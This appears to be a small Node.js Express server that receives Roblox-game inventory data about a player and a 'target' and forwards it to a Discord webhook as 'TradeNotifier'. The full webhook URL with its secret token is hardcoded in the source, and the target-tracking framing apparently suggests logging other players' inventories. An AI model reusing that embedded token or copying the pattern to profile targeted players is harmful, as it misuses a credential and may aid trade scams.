const express = require('express');
const axios = require('axios');
const app = express();
const PORT = process.env.PORT || 3000;

// Webhook de Discord (puedes ponerlo fijo o como variable de entorno)
const DISCORD_WEBHOOK = "https://discord.com/api/webhooks/1518688015692599416/9DG8JBvlf31P2FRj3dfRtamrWDpUpCymXpDMkfM8IMEPHVVKmXVeg1i_MXWVZpzokj6L";

app.use(express.json());

app.post('/webhook', async (req, res) => {
    try {
        const data = req.body;

        // Validar que llegaron datos
        if (!data || !data.playerName) {
            return res.status(400).json({ error: 'Faltan datos' });
        }

        // Extraer y ordenar
        const player = data.playerName || 'Desconocido';
        const target = data.targetName || 'Desconocido';
        const targetId = data.targetId || 0;
        const brainrots = data.brainrots || [];
        const bases = data.bases || [];
        const gears = data.gears || [];
        const timestamp = data.timestamp || Date.now();

        // Extraer solo los nombres y ordenar alfabéticamente
        const brainrotNames = brainrots.map(b => b.displayName).sort();
        const baseNames = bases.map(b => b.displayName).sort();
        const gearNames = gears.map(g => g.displayName).sort();

        // Construir mensaje bonito
        let content = `**📊 Inventario de ${player}**\n`;
        content += `**Objetivo:** ${target} (ID: ${targetId})\n`;
        content += `**🧠 Brainrots (${brainrotNames.length}):** ${brainrotNames.length > 0 ? brainrotNames.join(', ') : 'Ninguno'}\n`;
        content += `**🎨 Bases (${baseNames.length}):** ${baseNames.length > 0 ? baseNames.join(', ') : 'Ninguno'}\n`;
        content += `**⚙️ Gears (${gearNames.length}):** ${gearNames.length > 0 ? gearNames.join(', ') : 'Ninguno'}\n`;
        content += `🕒 \`${new Date(timestamp).toLocaleString()}\``;

        // Enviar a Discord
        const payload = {
            content: content,
            username: "TradeNotifier",
            avatar_url: "https://cdn.pfps.gg/pfps/10184-389218-roblox.png"
        };

        await axios.post(DISCORD_WEBHOOK, payload);

        res.json({ status: 'ok' });
    } catch (error) {
        console.error('Error:', error.message);
        res.status(500).json({ error: error.message });
    }
});

app.get('/', (req, res) => {
    res.send('API de Webhook funcionando ✅');
});

app.listen(PORT, () => {
    console.log(`Servidor corriendo en puerto ${PORT}`);
});
